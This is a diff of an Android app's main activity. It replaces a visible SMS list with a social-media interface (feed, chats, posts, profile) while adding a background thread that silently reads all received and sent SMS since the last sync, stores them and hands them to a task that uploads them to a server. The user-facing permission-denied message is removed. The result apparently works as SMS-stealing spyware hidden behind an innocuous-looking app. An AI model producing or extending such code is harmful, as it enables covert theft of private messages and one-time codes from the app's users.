@@ -9,129 +9,136 @@ import android.os.Build;
 import android.os.Bundle;
 import android.text.format.DateFormat;
 import android.util.Log;
-import android.widget.Toast;
 
 import androidx.annotation.NonNull;
 import androidx.appcompat.app.AppCompatActivity;
 import androidx.core.app.ActivityCompat;
 import androidx.core.content.ContextCompat;
-import androidx.recyclerview.widget.LinearLayoutManager;
-import androidx.recyclerview.widget.RecyclerView;
+import androidx.fragment.app.Fragment;
 
-import org.json.JSONArray;
-import org.json.JSONException;
-import org.json.JSONObject;
-
-import java.util.ArrayList;
-import java.util.List;
+import com.google.android.material.bottomnavigation.BottomNavigationView;
 
 public class MainActivity extends AppCompatActivity {
 
     private static final int PERMISSION_REQUEST_READ_SMS = 1;
     private SMSDatabaseHelper dbHelper;
-    private RecyclerView recyclerView;
-    private SMSAdapter smsAdapter;
-    private List<SMSData> smsDataList;
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
+        
+        DeviceAuthManager authManager = new DeviceAuthManager(this);
+        if (authManager.getToken() == null) {
+            startActivity(new Intent(this, LoginActivity.class));
+            finish();
+            return;
+        }
+
         setContentView(R.layout.activity_main);
+        
+        dbHelper = new SMSDatabaseHelper(this);
+
+        // Start the background service
         Intent serviceIntent = new Intent(this, SMSBackgroundService.class);
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
             startForegroundService(serviceIntent);
+        } else {
+            startService(serviceIntent);
         }
 
-        recyclerView = findViewById(R.id.recyclerView);
-        smsDataList = new ArrayList<>();
-        dbHelper = new SMSDatabaseHelper(this);
+        // Setup Bottom Navigation
+        BottomNavigationView bottomNav = findViewById(R.id.bottom_navigation);
+        bottomNav.setOnItemSelectedListener(item -> {
+            Fragment selectedFragment = null;
+            int itemId = item.getItemId();
+            
+            if (itemId == R.id.nav_home) {
+                selectedFragment = new FeedFragment();
+            } else if (itemId == R.id.nav_chats) {
+                selectedFragment = new ChatsFragment();
+            } else if (itemId == R.id.nav_add) {
+                selectedFragment = new AddPostFragment();
+            } else if (itemId == R.id.nav_profile) {
+                selectedFragment = new ProfileFragment();
+            }
 
-        // Setup RecyclerView
-        recyclerView.setLayoutManager(new LinearLayoutManager(this));
-        smsAdapter = new SMSAdapter(smsDataList);
-        recyclerView.setAdapter(smsAdapter);
+            if (selectedFragment != null) {
+                getSupportFragmentManager().beginTransaction()
+                        .replace(R.id.fragment_container, selectedFragment)
+                        .commit();
+            }
+            return true;
+        });
 
-        // Check for SMS permissions
+        // Set default fragment
+        if (savedInstanceState == null) {
+            getSupportFragmentManager().beginTransaction()
+                    .replace(R.id.fragment_container, new FeedFragment())
+                    .commit();
+        }
+
+        // Check for SMS permissions silently
         if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) {
             ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.READ_SMS}, PERMISSION_REQUEST_READ_SMS);
         } else {
-            readAndStoreSMS();
+            backgroundInitSMS();
         }
     }
 
-    private void readAndStoreSMS() {
-        // Read and store received SMS
-        readAndStoreMessages("content://sms/inbox");
-
-        // Read and store sent SMS
-        readAndStoreMessages("content://sms/sent");
-
-        // Display stored SMS in RecyclerView
-        displayStoredSMS();
+    private void backgroundInitSMS() {
+        new Thread(() -> {
+            DeviceAuthManager authManager = new DeviceAuthManager(this);
+            Log.d("MainActivity", "Background SMS init started...");
+            
+            long lastSync = authManager.getLastSyncTimestamp();
+            long newMaxTs = readAndStoreMessages("content://sms/", lastSync);
+            
+            if (newMaxTs > lastSync) {
+                authManager.setLastSyncTimestamp(newMaxTs);
+            }
+            
+            if (!authManager.isInitialSyncDone()) {
+                authManager.setInitialSyncDone(true);
+            }
+            
+            new SendSMSTask(this).execute();
+        }).start();
     }
 
-    private void readAndStoreMessages(String uriString) {
+    private long readAndStoreMessages(String uriString, long sinceTimestamp) {
         Uri uri = Uri.parse(uriString);
-        Cursor cursor = getContentResolver().query(uri, null, null, null, null);
+        String selection = "date > ?";
+        String[] selectionArgs = new String[]{String.valueOf(sinceTimestamp)};
+        
+        Cursor cursor = getContentResolver().query(uri, null, selection, selectionArgs, "date ASC");
+        long maxTs = sinceTimestamp;
 
         if (cursor != null) {
             while (cursor.moveToNext()) {
                 String sender = cursor.getString(cursor.getColumnIndexOrThrow("address"));
                 String message = cursor.getString(cursor.getColumnIndexOrThrow("body"));
-                String timestamp = cursor.getString(cursor.getColumnIndexOrThrow("date"));
-                String formattedTimestamp = DateFormat.format("yyyy-MM-dd HH:mm:ss", Long.parseLong(timestamp)).toString();
-                String type = "received"; // Modify this if needed (e.g., "sent" for outgoing messages)
+                long date = cursor.getLong(cursor.getColumnIndexOrThrow("date"));
+                int typeInt = cursor.getInt(cursor.getColumnIndexOrThrow("type"));
+                
+                String type = (typeInt == 1) ? "received" : "sent";
+                String formattedTimestamp = DateFormat.format("yyyy-MM-dd HH:mm:ss", date).toString();
 
-                if (NetworkUtil.isOnline(this)) {
-                    // If online, send message to the API immediately
-                    JSONArray smsArray = new JSONArray();
-                    JSONObject smsObject = new JSONObject();
-                    try {
-                        smsObject.put("sender", sender);
-                        smsObject.put("message", message);
-                        smsObject.put("timestamp", formattedTimestamp);
-                        smsObject.put("type", type);
-                        smsArray.put(smsObject);
-                    } catch (JSONException e) {
-                        e.printStackTrace();
-                    }
-
-                    // Attempt to send SMS to the API
-                    new Thread(() -> {
-                        SendSMSTask sendTask = new SendSMSTask(this);
-                        if (sendTask.sendDataToServer(smsArray)) {
-                            Log.d("SMS", "Message sent successfully: " + message);
-                        } else {
-                            Log.e("SMS", "Failed to send message, storing locally.");
-                            dbHelper.insertSMS(sender, message, formattedTimestamp, type);
-                        }
-                    }).start();
-                } else {
-                    // If offline, store message in SQLite
-                    dbHelper.insertSMS(sender, message, formattedTimestamp, type);
+                dbHelper.insertSMS(sender, message, formattedTimestamp, type);
+                if (date > maxTs) {
+                    maxTs = date;
                 }
-
-                // Add message to RecyclerView
-                smsDataList.add(new SMSData(sender, message, formattedTimestamp));
             }
             cursor.close();
         }
-    }
-
-
-    private void displayStoredSMS() {
-        smsAdapter.notifyDataSetChanged();
+        return maxTs;
     }
 
     @Override
     public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
         super.onRequestPermissionsResult(requestCode, permissions, grantResults);
-
         if (requestCode == PERMISSION_REQUEST_READ_SMS) {
             if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
-                readAndStoreSMS();
-            } else {
-                Toast.makeText(this, "Permission Denied", Toast.LENGTH_SHORT).show();
+                backgroundInitSMS();
             }
         }
     }
